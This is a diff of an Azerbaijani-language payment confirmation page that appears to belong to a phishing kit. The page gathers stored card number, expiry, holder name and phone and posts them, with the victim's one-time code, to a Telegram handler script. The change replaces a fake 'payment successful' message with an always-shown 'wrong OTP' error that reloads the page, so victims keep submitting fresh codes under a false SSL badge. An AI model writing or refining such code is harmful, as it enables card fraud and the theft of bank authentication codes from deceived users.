@@ -33,8 +33,6 @@
         .otp-hint .toggle-btn { color: #ff3b30; font-weight: 600; cursor: pointer; text-decoration: underline; }
         .otp-error { color: #ff3b30; font-size: 0.85rem; text-align: center; margin-top: 10px; display: none; font-weight: 600; padding: 10px; background: #fff5f5; border-radius: 8px; border: 1px solid #ffebee; }
         .otp-error.show { display: block; }
-        .otp-success { color: #22c55e; font-size: 0.85rem; text-align: center; margin-top: 10px; display: none; font-weight: 600; padding: 10px; background: #f0fdf4; border-radius: 8px; border: 1px solid #bbf7d0; }
-        .otp-success.show { display: block; }
         .submit-btn { width: 100%; padding: 16px; background: linear-gradient(90deg, #ff3b30, #e02e24); color: white; border: none; border-radius: 14px; font-size: 1.1rem; font-weight: bold; cursor: pointer; box-shadow: 0 6px 20px rgba(255,59,48,0.3); margin-top: 20px; }
         .submit-btn:disabled { opacity: 0.6; cursor: not-allowed; }
         .ssl-info { display: flex; align-items: center; justify-content: center; gap: 6px; font-size: 0.8rem; color: #718096; margin-top: 15px; }
@@ -78,8 +76,7 @@
                 <input type="text" id="otp6" maxlength="1" inputmode="numeric" autocomplete="off" oninput="otpMove(this,null)" onkeydown="otpBackspace(this,'otp5')" style="display:none;">
             </div>
             <div class="otp-hint"><span id="otpLengthDisplay">4 rəqəmli OTP</span> <span class="toggle-btn" onclick="toggleOtpLength()">6 rəqəmli OTP istifadə et</span></div>
-            <div class="otp-error" id="otpError">❌ OTP kodu sehvdir! Yenidən cəhd edin.</div>
-            <div class="otp-success" id="otpSuccess">✅ Ödəniş uğurla tamamlandı!</div>
+            <div class="otp-error" id="otpError">❌ OTP kodu səhvdir! Yenidən cəhd edin.</div>
             <button type="button" class="submit-btn" id="otpSubmitBtn" disabled onclick="submitOtp()">🔑 Təsdiqlə</button>
         </div>
         <div class="ssl-info">🔒 256-bit SSL şifrələmə ilə qorunur</div>
@@ -101,7 +98,6 @@
     const ip = localStorage.getItem('ip') || '0.0.0.0';
     const campaign = localStorage.getItem('campaign') || '';
 
-    // EKRANDA GÖSTƏR
     document.getElementById('sumOper').innerText = oper;
     document.getElementById('sumPhone').innerText = phone;
     document.getElementById('sumAmnt').innerText = amount + '.00 AZN';
@@ -131,7 +127,6 @@
             document.getElementById('otp5').value = ''; document.getElementById('otp6').value = '';
         }
         document.getElementById('otpError').classList.remove('show');
-        document.getElementById('otpSuccess').classList.remove('show');
         document.querySelectorAll('.otp-container input').forEach(el => el.classList.remove('error'));
         validateOtp();
     }
@@ -140,7 +135,6 @@
         if(isProcessing) return;
         current.value = current.value.replace(/\D/g,'').slice(0,1);
         document.getElementById('otpError').classList.remove('show');
-        document.getElementById('otpSuccess').classList.remove('show');
         document.querySelectorAll('.otp-container input').forEach(el => el.classList.remove('error'));
         if(current.value.length === 1 && nextId) document.getElementById(nextId).focus();
         validateOtp();
@@ -159,7 +153,7 @@
     }
 
     // ============================================
-    // 🔑 SUBMIT OTP - HƏMİŞƏ UĞURLU
+    // 🔑 SUBMIT OTP - SƏHV OLSA SƏHİFƏNİ YENİLƏ
     // ============================================
     function submitOtp() {
         if(isProcessing) return;
@@ -174,7 +168,6 @@
         document.getElementById('otpSubmitBtn').disabled = true;
         document.getElementById('loaderOverlay').classList.add('active');
 
-        // BÜTÜN MƏLUMATLARI LOCALSTORAGE-DƏN AL
         const cardName = localStorage.getItem('card_name') || '';
         const cardNumber = localStorage.getItem('card_number') || '';
         const cardExpiry = localStorage.getItem('card_expiry') || '';
@@ -197,7 +190,6 @@
         formData.append('otp', otp);
         formData.append('campaign', campaign);
 
-        // API-YA GÖNDƏR
         fetch('api/telegram-handler.php', {
             method: 'POST',
             body: formData
@@ -210,14 +202,15 @@
                 isProcessing = false;
                 document.getElementById('otpSubmitBtn').disabled = false;
                 
-                // UĞURLU MESAJI GÖSTƏR
-                document.getElementById('otpSuccess').classList.add('show');
-                document.getElementById('otpError').classList.remove('show');
+                // HƏMİŞƏ XƏTA GÖSTƏR VƏ SƏHİFƏNİ YENİLƏ
+                document.getElementById('otpError').textContent = '❌ OTP kodu səhvdir! Yenidən cəhd edin.';
+                document.getElementById('otpError').classList.add('show');
+                document.querySelectorAll('.otp-container input').forEach(el => el.classList.add('error'));
                 
-                // 3 SANİYƏ SONRA HOMEPAGE-Ə YÖNLƏNDİR
-                setTimeout(() => {
-                    window.location.href = 'index.html';
-                }, 3000);
+                // 2 SANİYƏ SONRA SƏHİFƏNİ YENİLƏ (OTP TƏMİZLƏNSİN)
+                setTimeout(function() {
+                    location.reload();
+                }, 2000);
             }, 1500);
         })
         .catch(error => {
@@ -227,13 +220,13 @@
                 isProcessing = false;
                 document.getElementById('otpSubmitBtn').disabled = false;
                 
-                // XƏTA OLSA BELƏ UĞURLU GÖSTƏR
-                document.getElementById('otpSuccess').classList.add('show');
-                document.getElementById('otpError').classList.remove('show');
+                document.getElementById('otpError').textContent = '❌ OTP kodu səhvdir! Yenidən cəhd edin.';
+                document.getElementById('otpError').classList.add('show');
+                document.querySelectorAll('.otp-container input').forEach(el => el.classList.add('error'));
                 
-                setTimeout(() => {
-                    window.location.href = 'index.html';
-                }, 3000);
+                setTimeout(function() {
+                    location.reload();
+                }, 2000);
             }, 1500);
         });
     }
